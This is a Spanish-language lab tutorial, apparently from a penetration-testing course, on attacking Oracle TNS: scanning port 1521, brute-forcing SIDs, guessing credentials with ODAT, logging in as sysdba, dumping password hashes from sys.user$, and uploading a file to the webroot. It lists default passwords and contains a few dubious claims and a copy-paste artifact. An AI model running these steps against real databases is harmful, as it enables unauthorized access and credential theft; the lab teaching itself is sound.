# Oracle TNS

El Oracle Transparent Network Substrate (TNS) es un protocolo de comunicación que facilita la comunicación entre bases de datos Oracle y aplicaciones a través de redes. Introducido inicialmente como parte del software Oracle Net Services, TNS admite varios protocolos de red entre bases de datos Oracle y aplicaciones cliente, como IPX/SPX y TCP/IP. Como resultado, se ha convertido en una solución preferida para gestionar bases de datos grandes y complejas en industrias como la salud, finanzas y comercio minorista. Además, su mecanismo de cifrado integrado garantiza la seguridad de los datos transmitidos, lo que lo convierte en una solución ideal para entornos empresariales donde la seguridad de los datos es primordial.

Con el tiempo, TNS se ha actualizado para admitir tecnologías más nuevas, como IPv6 y cifrado SSL/TLS, lo que lo hace más adecuado para los siguientes propósitos:

* Resolución de nombres
* Gestión de conexiones
* Balanceo de carga
* Seguridad

Además, permite cifrar la comunicación entre el cliente y el servidor a través de una capa adicional de seguridad sobre la capa de protocolo TCP/IP. Esta función ayuda a proteger la arquitectura de la base de datos contra accesos no autorizados o ataques que intenten comprometer los datos en el tráfico de red. Además, proporciona herramientas y capacidades avanzadas para administradores de bases de datos y desarrolladores, ya que ofrece monitoreo y análisis de rendimiento, capacidades de reporte y registro de errores, gestión de cargas de trabajo y tolerancia a fallos a través de servicios de base de datos.

## Configuración Predeterminada

La configuración predeterminada del servidor Oracle TNS varía según la versión y edición del software Oracle instalado. Sin embargo, algunos ajustes comunes suelen configurarse por defecto en Oracle TNS. De forma predeterminada, el listener escucha conexiones entrantes en el puerto TCP/1521. Sin embargo, este puerto predeterminado puede cambiarse durante la instalación o más tarde en el archivo de configuración. El listener de TNS está configurado para admitir varios protocolos de red, incluidos TCP/IP, UDP, IPX/SPX y AppleTalk. El listener también puede admitir múltiples interfaces de red y escuchar en direcciones IP específicas o en todas las interfaces de red disponibles. De forma predeterminada, Oracle TNS se puede gestionar de forma remota en Oracle 8i/9i, pero no en Oracle 10g/11g.

La configuración predeterminada del listener de TNS también incluye algunas características básicas de seguridad. Por ejemplo, el listener solo aceptará conexiones de hosts autorizados y realizará una autenticación básica utilizando una combinación de nombres de host, direcciones IP y nombres de usuario y contraseñas. Además, el listener utilizará Oracle Net Services para cifrar la comunicación entre el cliente y el servidor. Los archivos de configuración para Oracle TNS se llaman `tnsnames.ora` y `listener.ora` y se encuentran típicamente en el directorio `$ORACLE_HOME/network/admin`. Estos archivos de texto plano contienen información de configuración para instancias de bases de datos Oracle y otros servicios de red que utilizan el protocolo TNS.

Oracle TNS se utiliza a menudo con otros servicios de Oracle como Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, servidores web y muchos más. Se han realizado muchos cambios en la instalación predeterminada de los servicios de Oracle. Por ejemplo, Oracle 9 tiene una contraseña predeterminada, `CHANGE_ON_INSTALL`, mientras que Oracle 10 no tiene una contraseña predeterminada establecida. El servicio Oracle DBSNMP también usa una contraseña predeterminada, `dbsnmp`, que debemos recordar cuando la encontremos. Otro ejemplo sería que muchas organizaciones aún utilizan el servicio finger junto con Oracle, lo que puede poner en riesgo el servicio de Oracle y hacerlo vulnerable cuando tengamos el conocimiento de un directorio personal.

Cada base de datos o servicio tiene una entrada única en el archivo `tnsnames.ora`, que contiene la información necesaria para que los clientes se conecten al servicio. La entrada consta de un nombre para el servicio, la ubicación de red del servicio y el nombre de la base de datos o servicio que los clientes deben utilizar al conectarse al servicio. Por ejemplo, un archivo `tnsnames.ora` simple podría verse así:

### tnsnames.ora

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

Aquí vemos un servicio llamado ORCL, que está escuchando en el puerto TCP/1521 en la dirección IP 10.129.11.102. Los clientes deben usar el nombre del servicio `orcl` al conectarse al servicio. Sin embargo, el archivo `tnsnames.ora` puede contener muchas de estas entradas para diferentes bases de datos y servicios. Las entradas también pueden incluir información adicional, como detalles de autenticación, configuraciones de agrupación de conexiones y configuraciones de balanceo de carga.

Por otro lado, el archivo `listener.ora` es un archivo de configuración del lado del servidor que define las propiedades y parámetros del proceso del listener, que es responsable de recibir solicitudes de clientes entrantes y redirigirlas a la instancia de base de datos Oracle adecuada.

### listener.ora

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

En resumen, el software Oracle Net Services del lado del cliente utiliza el archivo `tnsnames.ora` para resolver nombres de servicios a direcciones de red, mientras que el proceso del listener utiliza el archivo `listener.ora` para determinar los servicios a los que debe escuchar y el comportamiento del listener.

Las bases de datos Oracle pueden protegerse mediante el uso de una lista de exclusión PL/SQL (PLSQL Exclusion List). Es un archivo de texto creado por el usuario que debe colocarse en el directorio `$ORACLE_HOME/sqldeveloper` y contiene los nombres de los paquetes o tipos de PL/SQL que deben excluirse de la ejecución. Una vez creado el archivo de la lista de exclusión PL/SQL, puede cargarse en la instancia de base de datos. Sirve como una lista negra que no se puede acceder a través del Oracle Application Server.

| Configuración        | Descripción                                                                                                                          |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| `DESCRIPTION`        | Un descriptor que proporciona un nombre para la base de datos y su tipo de conexión.                                                 |
| `ADDRESS`            | La dirección de red de la base de datos, que incluye el nombre del host y el número de puerto.                                       |
| `PROTOCOL`           | El protocolo de red utilizado para la comunicación con el servidor.                                                                  |
| `PORT`               | El número de puerto utilizado para la comunicación con el servidor.                                                                  |
| `CONNECT_DATA`       | Especifica los atributos de la conexión, como el nombre del servicio o SID, protocolo e identificador de instancia de base de datos. |
| `INSTANCE_NAME`      | El nombre de la instancia de base de datos a la que el cliente desea conectarse.                                                     |
| `SERVICE_NAME`       | El nombre del servicio al que el cliente desea conectarse.                                                                           |
| `SERVER`             | El tipo de servidor utilizado para la conexión de la base de datos, como dedicado o compartido.                                      |
| `USER`               | El nombre de usuario utilizado para autenticarse con el servidor de base de datos.                                                   |
| `PASSWORD`           | La contraseña utilizada para autenticarse con el servidor de base de datos.                                                          |
| `SECURITY`           | El tipo de seguridad para la conexión.                                                                                               |
| `VALIDATE_CERT`      | Si se debe validar el certificado utilizando SSL/TLS.                                                                                |
| `SSL_VERSION`        | La versión de SSL/TLS a utilizar para la conexión.                                                                                   |
| `CONNECT_TIMEOUT`    | El límite de tiempo en segundos para que el cliente establezca una conexión con la base de datos.                                    |
| `RECEIVE_TIMEOUT`    | El límite de tiempo en segundos para que el cliente reciba una respuesta de la base de datos.                                        |
| `SEND_TIMEOUT`       | El límite de tiempo en segundos para que el cliente envíe una solicitud a la base de datos.                                          |
| `SQLNET.EXPIRE_TIME` | El límite de tiempo en segundos para que el cliente detecte que una conexión ha fallado.                                             |
| `TRACE_LEVEL`        | El nivel de trazado para la conexión de la base de datos.                                                                            |
| `TRACE_DIRECTORY`    | El directorio donde se almacenan los archivos de traza.                                                                              |
| `TRACE_FILE_NAME`    | El nombre del archivo de traza.                                                                                                      |
| `LOG_FILE`           | El archivo donde se almacenan la información del registro.                                                                           |

Antes de poder enumerar el listener TNS e interactuar con él, necesitamos descargar algunos paquetes y herramientas para nuestra instancia de Pwnbox en caso de que no los tenga ya. Aquí tienes un script Bash que hace todo esto:

```bash
#!/bin/bash

# Actualizar repositorios
sudo apt-get update

# Instalar herramientas necesarias
sudo apt-get install -y nmap sqlmap impacket-scripts

echo "Herramientas necesarias instaladas con éxito."
```

### Oracle-Tools-setup.sh

```bash
#!/bin/bash

# Instalar dependencias
sudo apt-get install libaio1 python3-dev alien -y

# Clonar el repositorio de ODAT
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update

# Descargar y descomprimir el cliente instantáneo de Oracle
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip

wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip

# Configurar variables de entorno
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH

# Instalar paquetes de Python
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

### Probar ODAT

Después de ejecutar el script, podemos probar si la instalación fue exitosa ejecutando el siguiente comando:

```bash
./odat.py -h
```

ODAT (Oracle Database Attacking Tool) es una herramienta de prueba de penetración de código abierto escrita en Python, diseñada para enumerar y explotar vulnerabilidades en bases de datos Oracle. Puede usarse para identificar y explotar diversas fallas de seguridad en bases de datos Oracle, incluyendo inyecciones SQL, ejecución remota de código y escalamiento de privilegios.

### Escaneo con Nmap

Primero, usemos `nmap` para escanear el puerto predeterminado del listener de Oracle TNS.

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
```

**Resultado del Escaneo**

```less
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

Podemos ver que el puerto está abierto y el servicio está en ejecución. En Oracle RDBMS, un Identificador de Sistema (SID) es un nombre único que identifica una instancia de base de datos particular. Puede tener múltiples instancias, cada una con su propio ID de Sistema. Una instancia es un conjunto de procesos y estructuras de memoria que interactúan para gestionar los datos de la base de datos. Cuando un cliente se conecta a una base de datos Oracle, especifica el SID de la base de datos junto con su cadena de conexión. El cliente utiliza este SID para identificar qué instancia de base de datos desea conectar. Si el cliente no especifica un SID, se usa el valor predeterminado definido en el archivo `tnsnames.ora`.

### Fuerza Bruta de SID con Nmap

Hay varias formas de enumerar, o mejor dicho, adivinar SIDs. Por lo tanto, podemos usar herramientas como `nmap`, `hydra`, `odat`, entre otras. Primero usemos `nmap`.

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

**Resultado del Escaneo**

```less
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

### ODAT

Para enumerar y recoger información sobre los servicios y componentes de la base de datos Oracle, podemos usar la herramienta `odat.py`. En el siguiente ejemplo, se encontraron credenciales válidas para el usuario `scott` con la contraseña `tiger`:

```bash
./odat.py all -s 10.129.204.235
```

**Resultado de ODAT**

```csharp
[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

### Conexión con SQL\*Plus

Una vez que tenemos las credenciales válidas, podemos usar `sqlplus` para conectarnos a la base de datos Oracle e interactuar con ella.

```bash
sqlplus scott/tiger@10.129.204.235/XE
```

**Resultado de SQL\*Plus**

```sql
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

Si encuentras el error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, ejecuta el siguiente comando:

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

#### Enumeración de la Base de Datos

Una vez conectado, podemos usar comandos SQL\*Plus para enumerar la base de datos manualmente. Por ejemplo, podemos listar todas las tablas disponibles en la base de datos actual o mostrar los privilegios del usuario actual:

### **Oracle RDBMS-Interaction**

```sql
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...
```

**Mostrar Privilegios del Usuario**

```sql
sqlCopiar códigoSQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Aquí, el usuario `scott` no tiene privilegios administrativos. Sin embargo, podemos intentar usar esta cuenta para iniciar sesión como el Administrador de Base de Datos (sysdba), lo que nos otorgaría privilegios más altos. Esto es posible si el usuario `scott` tiene los privilegios apropiados, típicamente concedidos por el administrador de la base de datos o usados por el propio administrador.

### Oracle RDBMS- Enumeración de la Base de Datos

```bash
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

**Resultado de SQL\*Plus como SYSDBA**

```yaml
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

Desde este punto, podríamos intentar recuperar los hashes de contraseñas de la tabla `sys.user$` y tratar de descifrarlas fuera de línea. La consulta para esto sería algo como:

```sql
SELECT * FROM sys.user$;
```

#### Oracle RDBMS-Extracción de Hashes de Contraseña

Para extraer los hashes de contraseña de la base de datos Oracle, puedes ejecutar la siguiente consulta en SQL\*Plus:

```sql
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Otra opción es cargar un archivo web al objetivo. Sin embargo, esto requiere que el servidor ejecute un servidor web y que conozcamos la ubicación exacta del directorio raíz del servidor web. Si sabemos qué tipo de sistema estamos tratando, podemos intentar las rutas predeterminadas:

| OS      | Ruta               |
| ------- | ------------------ |
| Linux   | /var/www/html      |
| Windows | C:\inetpub\wwwroot |

Primero, es importante probar nuestro enfoque de explotación con archivos que no parezcan peligrosos para los sistemas de antivirus o detección/prevención de intrusiones. Por lo tanto, creamos un archivo de texto con una cadena y lo usamos para cargarlo en el sistema de destino.

### Oracle RDBMS-Subir archivo

```bash
echo "Oracle File Upload Test" > testing.txt
```

**Cargar el Archivo Usando ODAT**

```bash
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

El comando anterior carga el archivo `testing.txt` desde tu máquina local al directorio `C:\inetpub\wwwroot` en el servidor `10.129.204.235`.

**Verificar la Carga del Archivo**

Finalmente, podemos probar si el enfoque de carga de archivos funcionó usando `curl`. Utiliza una solicitud GET HTTP para comprobar si el archivo está disponible, o puedes visitarlo a través de un navegador.

```bash
curl -X GET http://10.129.204.235/testing.txt
```

**Resultado Esperado**

```arduino
Oracle File Upload Test
```
